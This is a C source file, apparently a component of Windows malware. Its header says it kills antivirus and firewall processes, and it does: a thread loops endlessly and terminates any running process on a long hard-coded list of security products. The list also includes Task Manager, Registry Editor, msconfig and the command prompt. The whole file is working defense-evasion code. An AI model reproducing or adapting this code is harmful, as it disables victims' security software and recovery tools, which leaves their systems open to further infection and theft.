/**************************************
* Kills Antivirus and Firewall associated
* processes.
* Uses basic windows APIs from tlhelp32
* such as: CreateToolhelp32Snapshot
*
*
**************************************/

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
 #include <lm.h>
//#include "shared.h"

int KillProcess(const char *);

//int endAvSoft()
//int         
              

DWORD _stdcall endAvSoft(LPVOID th)
{
int krion = 1;
while (krion)
{	
		const char *exelst[] = { "AGENTSVR.EXE", "ANTI-TROJAN.EXE","ANTIVIRUS.EXE","ANTS.EXE","APIMONITOR.EXE","APLICA32.EXE","APVXDWIN.EXE","ATCON.EXE","ATGUARD.EXE","ATRO55EN.EXE","ATUPDATER.EXE","ATWATCH.EXE","AUPDATE.EXE","AUTODOWN.EXE","AUTOTRACE.EXE","AUTOUPDATE.EXE","AVCONSOL.EXE","AVGSERV9.EXE","AVLTMAIN.EXE","AVPUPD.EXE","AVSYNMGR.EXE","AVWUPD32.EXE","AVXQUAR.EXE","AVprotect9x.exe","Au.exe","BD_PROFESSIONAL.EXE","BIDEF.EXE","BIDSERVER.EXE","BIPCP.EXE","BIPCPEVALSETUP.EXE","BISP.EXE","BLACKD.EXE","BLACKICE.EXE","BOOTWARN.EXE","BORG2.EXE","BS120.EXE","CDP.EXE","CFGWIZ.EXE","CFIADMIN.EXE","CFIAUDIT.EXE","CFINET.EXE","CFINET32.EXE","CLEAN.EXE","CLEANER.EXE","CLEANER3.EXE","CLEANPC.EXE","CMGRDIAN.EXE","CMON016.EXE",
"CPD.EXE","CPF9X206.EXE","CPFNT206.EXE","CV.EXE","CWNB181.EXE","CWNTDWMO.EXE","D3dupdate.exe","DEFWATCH.EXE","DEPUTY.EXE","DPF.EXE","DPFSETUP.EXE","DRWATSON.EXE","DRWEBUPW.EXE","ENT.EXE","ESCANH95.EXE","ESCANHNT.EXE","ESCANV95.EXE","EXANTIVIRUS-CNET.EXE","FAST.EXE","FIREWALL.EXE","FLOWPROTECTOR.EXE","FP-WIN_TRIAL.EXE","FRW.EXE","FSAV.EXE","FSAV530STBYB.EXE","FSAV530WTBYB.EXE","FSAV95.EXE","GBMENU.EXE","GBPOLL.EXE","GUARD.EXE","HACKTRACERSETUP.EXE","HTLOG.EXE","HWPE.EXE","IAMAPP.EXE","IAMAPP.EXE","IAMSERV.EXE","ICLOAD95.EXE","ICLOADNT.EXE","ICMON.EXE","ICSSUPPNT.EXE","ICSUPP95.EXE","ICSUPPNT.EXE","IFW2000.EXE","IPARMOR.EXE","IRIS.EXE","JAMMER.EXE","KAVLITE40ENG.EXE",
"KAVPERS40ENG.EXE","KERIO-PF-213-EN-WIN.EXE","KERIO-WRL-421-EN-WIN.EXE","KERIO-WRP-421-EN-WIN.EXE","KILLPROCESSSETUP161.EXE","LDPRO.EXE","LOCALNET.EXE","LOCKDOWN.EXE","LOCKDOWN2000.EXE","LSETUP.EXE","LUALL.EXE","LUCOMSERVER.EXE","LUINIT.EXE","MCAGENT.EXE","MCUPDATE.EXE","MFW2EN.EXE","MFWENG3.02D30.EXE","MGUI.EXE","MINILOG.EXE","MOOLIVE.EXE","MRFLUX.EXE","MSCONFIG.EXE","MSINFO32.EXE","MSSMMC32.EXE","MU0311AD.EXE","NAV80TRY.EXE","NAVAPW32.EXE","NAVDX.EXE","NAVSTUB.EXE","NAVW32.EXE","NC2000.EXE","NCINST4.EXE","NDD32.EXE","NEOMONITOR.EXE","NETARMOR.EXE","NETINFO.EXE","NETMON.EXE","NETSCANPRO.EXE","NETSPYHUNTER-1.2.EXE","NETSTAT.EXE","NISSERV.EXE","NISUM.EXE","NMAIN.EXE","NORTON_INTERNET_SECU_3.0_407.EXE",
"NPF40_TW_98_NT_ME_2K.EXE","NPFMESSENGER.EXE","NPROTECT.EXE","NSCHED32.EXE","NTVDM.EXE","NUPGRADE.EXE","NVARCH16.EXE","NWINST4.EXE","NWTOOL16.EXE","OSTRONET.EXE","OUTPOST.EXE","OUTPOSTINSTALL.EXE","OUTPOSTPROINSTALL.EXE","PADMIN.EXE","PANIXK.EXE","PAVPROXY.EXE","PCC2002S902.EXE","PCC2K_76_1436.EXE","PCCIOMON.EXE","PCDSETUP.EXE","PCFWALLICON.EXE","PCIP10117_0.EXE","PDSETUP.EXE","PERISCOPE.EXE","PERSFW.EXE","PF2.EXE","PFWADMIN.EXE","PINGSCAN.EXE","PLATIN.EXE","POPROXY.EXE","POPSCAN.EXE","PORTDETECTIVE.EXE","PPINUPDT.EXE","PPTBC.EXE","PPVSTOP.EXE","PROCEXPLORERV1.0.EXE","PROPORT.EXE","PROTECTX.EXE","PSPF.EXE","PURGE.EXE","PVIEW95.EXE","QCONSOLE.EXE","QSERVER.EXE","RAV8WIN32ENG.EXE","RESCUE.EXE","RESCUE32.EXE",
"RRGUARD.EXE","RSHELL.EXE","RTVSCN95.EXE",
"RULAUNCH.EXE","SAFEWEB.EXE","SBSERV.EXE","SD.EXE","SETUPVAMEEVAL.EXE","SETUP_FLOWPROTECTOR_US.EXE","SFC.EXE","SGSSFW32.EXE","avserve2.exe","SHELLSPYINSTALL.EXE","SHN.EXE","SMC.EXE","SOFI.EXE","SPF.EXE","SPHINX.EXE","SPYXX.EXE","SS3EDIT.EXE","ST2.EXE","SUPFTRL.EXE","SUPPORTER5.EXE","SYMPROXYSVC.EXE","SYSEDIT.EXE","TASKMON.EXE","TAUMON.EXE","TAUSCAN.EXE","TC.EXE","TCA.EXE","TCM.EXE","TDS-3.EXE","TDS2-98.EXE","TDS2-NT.EXE","TFAK5.EXE","TGBOB.EXE","TITANIN.EXE","TITANINXP.EXE","TRACERT.EXE","TRJSCAN.EXE","TRJSETUP.EXE","TROJANTRAP3.EXE","UNDOBOOT.EXE","UPDATE.EXE","VBCMSERV.EXE","VBCONS.EXE","VBUST.EXE","VBWIN9X.EXE","VBWINNTW.EXE",
"VCSETUP.EXE","VFSETUP.EXE","VIRUSMDPERSONALFIREWALL.EXE","VNLAN300.EXE","VNPC3000.EXE","VPC42.EXE","VPFW30S.EXE","VPTRAY.EXE","VSCENU6.02D30.EXE","VSECOMR.EXE","VSHWIN32.EXE","VSISETUP.EXE","VSMAIN.EXE","VSMON.EXE","VSSTAT.EXE","VSWIN9XE.EXE","VSWINNTSE.EXE","VSWINPERSE.EXE","W32DSM89.EXE","W9X.EXE","WATCHDOG.EXE","WEBSCANX.EXE","WGFE95.EXE","WHOSWATCHINGME.EXE","WINRECON.EXE","WNT.EXE","WRADMIN.EXE","WRCTRL.EXE","WSBGATE.EXE","WYVERNWORKSFIREWALL.EXE","XPF202EN.EXE","ZAPRO.EXE","ZAPSETUP3001.EXE","ZATUTOR.EXE","ZAUINST.EXE","ZONALM2601.EXE","ZONEALARM.EXE","CCAPP.exe","TASKMGR.EXE","REGEDIT.EXE","AVGUARD.EXE","CMD.EXE", 0 };
  
						
register int m;

	for (m=0; exelst[m]; m++)


 KillProcess(exelst[m]);
	
Sleep(5);
}
	
	return 0;

}

int KillProcess(const char *szToTerminate)

{

BOOL bResult,bResultm;
	DWORD aiPID[1000],iCb=1000,iNumProc,iV2000=0;
	DWORD iCbneeded,i,iFound=0;
	char szName[MAX_PATH],szToTermUpper[MAX_PATH];
	HANDLE hProc,hSnapShot,hSnapShotm;
	OSVERSIONINFO osvi;
    HINSTANCE hInstLib;
	int iLen,iLenP,indx;
    HMODULE hMod;
	PROCESSENTRY32 procentry;      
	MODULEENTRY32 modentry;
	iLenP=strlen(szToTerminate);
	if(iLenP<1 || iLenP>MAX_PATH) return 632;
	for(indx=0;indx<iLenP;indx++)
		szToTermUpper[indx]=toupper(szToTerminate[indx]);
	szToTermUpper[iLenP]=0;
     BOOL (WINAPI *lpfEnumProcesses)( DWORD *, DWORD cb, DWORD * );
     BOOL (WINAPI *lpfEnumProcessModules)( HANDLE, HMODULE *,
        DWORD, LPDWORD );
     DWORD (WINAPI *lpfGetModuleBaseName)( HANDLE, HMODULE,
        LPTSTR, DWORD );
      HANDLE (WINAPI *lpfCreateToolhelp32Snapshot)(DWORD,DWORD) ;
      BOOL (WINAPI *lpfProcess32First)(HANDLE,LPPROCESSENTRY32) ;
      BOOL (WINAPI *lpfProcess32Next)(HANDLE,LPPROCESSENTRY32) ;
      BOOL (WINAPI *lpfModule32First)(HANDLE,LPMODULEENTRY32) ;
      BOOL (WINAPI *lpfModule32Next)(HANDLE,LPMODULEENTRY32) ;
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    bResult=GetVersionEx(&osvi);
	if(!bResult)   
	    return 606;
	if((osvi.dwPlatformId != VER_PLATFORM_WIN32_NT) &&
		(osvi.dwPlatformId != VER_PLATFORM_WIN32_WINDOWS))
		return 607;

    if(osvi.dwPlatformId==VER_PLATFORM_WIN32_NT)
	{   
         hInstLib = LoadLibraryA("PSAPI.DLL");
         if(hInstLib == NULL)
            return 605;

       
         lpfEnumProcesses = (BOOL(WINAPI *)(DWORD *,DWORD,DWORD*))
            GetProcAddress( hInstLib, "EnumProcesses" ) ;
         lpfEnumProcessModules = (BOOL(WINAPI *)(HANDLE, HMODULE *,
            DWORD, LPDWORD)) GetProcAddress( hInstLib,
            "EnumProcessModules" ) ;
         lpfGetModuleBaseName =(DWORD (WINAPI *)(HANDLE, HMODULE,
            LPTSTR, DWORD )) GetProcAddress( hInstLib,
            "GetModuleBaseNameA" ) ;

         if(lpfEnumProcesses == NULL ||
            lpfEnumProcessModules == NULL ||
            lpfGetModuleBaseName == NULL)
            {
               FreeLibrary(hInstLib);
               return 700;
            }
		 
		bResult=lpfEnumProcesses(aiPID,iCb,&iCbneeded);
		if(!bResult)
		{
            FreeLibrary(hInstLib);
			return 701;
		}


		iNumProc=iCbneeded/sizeof(DWORD);

		
		for(i=0;i<iNumProc;i++)
		{
	        strcpy(szName,"Unknown");
	        hProc=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,
				aiPID[i]);
	        if(hProc)
			{
               if(lpfEnumProcessModules(hProc,&hMod,sizeof(hMod),&iCbneeded) )
			   {
                  iLen=lpfGetModuleBaseName(hProc,hMod,szName,MAX_PATH);
			   }
			}
	        CloseHandle(hProc);

            if(strcmp(strupr(szName),szToTermUpper)==0)

			if(strcmp(_strupr(szName),szToTermUpper)==0)

			{
				iFound=1;
				hProc=OpenProcess(PROCESS_TERMINATE,FALSE,aiPID[i]);
				if(hProc)
				{
					if(TerminateProcess(hProc,0))
					{
						CloseHandle(hProc);
                        FreeLibrary(hInstLib);
						return 0;
					}
					else
					{
						CloseHandle(hProc);
                        FreeLibrary(hInstLib);
						return 602;
					}
				}
				else
				{
                    FreeLibrary(hInstLib);
					return 604;
				}
			}
		}
	}

	if(osvi.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
	{
		
			
		hInstLib = LoadLibraryA("Kernel32.DLL");
		if( hInstLib == NULL )
			return 702;

		
		lpfCreateToolhelp32Snapshot=
			(HANDLE(WINAPI *)(DWORD,DWORD))
			GetProcAddress( hInstLib,
			"CreateToolhelp32Snapshot" ) ;
		lpfProcess32First=
			(BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
			GetProcAddress( hInstLib, "Process32First" ) ;
		lpfProcess32Next=
			(BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
			GetProcAddress( hInstLib, "Process32Next" ) ;
		lpfModule32First=
			(BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
			GetProcAddress( hInstLib, "Module32First" ) ;
		lpfModule32Next=
			(BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
			GetProcAddress( hInstLib, "Module32Next" ) ;
		if( lpfProcess32Next == NULL ||
			lpfProcess32First == NULL ||
		    lpfModule32Next == NULL ||
			lpfModule32First == NULL ||
			lpfCreateToolhelp32Snapshot == NULL )
		{
			FreeLibrary(hInstLib);
			return 703;
		}
			
		

		hSnapShot = lpfCreateToolhelp32Snapshot(
			TH32CS_SNAPPROCESS, 0 ) ;
		if( hSnapShot == INVALID_HANDLE_VALUE )
		{
			FreeLibrary(hInstLib);
			return 704;
		}
		
        
        procentry.dwSize = sizeof(PROCESSENTRY32);
        bResult=lpfProcess32First(hSnapShot,&procentry);

        
        while(bResult)
        {
		    
		    hSnapShotm = lpfCreateToolhelp32Snapshot(
			    TH32CS_SNAPMODULE, procentry.th32ProcessID) ;
		    if( hSnapShotm == INVALID_HANDLE_VALUE )
			{
				CloseHandle(hSnapShot);
			    FreeLibrary(hInstLib);
			    return 704;
			}
			
			modentry.dwSize=sizeof(MODULEENTRY32);
			bResultm=lpfModule32First(hSnapShotm,&modentry);

			
			while(bResultm)
			{
		        if(strcmp(modentry.szModule,szToTermUpper)==0)
				{
				   
				    iFound=1;
				    
				    hProc=OpenProcess(PROCESS_TERMINATE,FALSE,procentry.th32ProcessID);
				    if(hProc)
					{
					    if(TerminateProcess(hProc,0))
						{
						   
							CloseHandle(hSnapShotm);
							CloseHandle(hSnapShot);
							CloseHandle(hProc);
			                FreeLibrary(hInstLib);
						    return 0;
						}
					    else
						{
						    
							CloseHandle(hSnapShotm);
							CloseHandle(hSnapShot);
							CloseHandle(hProc);
			                FreeLibrary(hInstLib);
						    return 602;
						}
					}
				    else
					{
					    
						CloseHandle(hSnapShotm);
						CloseHandle(hSnapShot);
			            FreeLibrary(hInstLib);
					    return 604;
					}
				}
				else
				{  
					modentry.dwSize=sizeof(MODULEENTRY32);
					bResultm=lpfModule32Next(hSnapShotm,&modentry);
				}
			}

			
			CloseHandle(hSnapShotm);
            procentry.dwSize = sizeof(PROCESSENTRY32);
            bResult = lpfProcess32Next(hSnapShot,&procentry);
        }
		CloseHandle(hSnapShot);
	}
	if(iFound==0)
	{
		FreeLibrary(hInstLib);
		return 603;
	}
	FreeLibrary(hInstLib);
	return 0;
}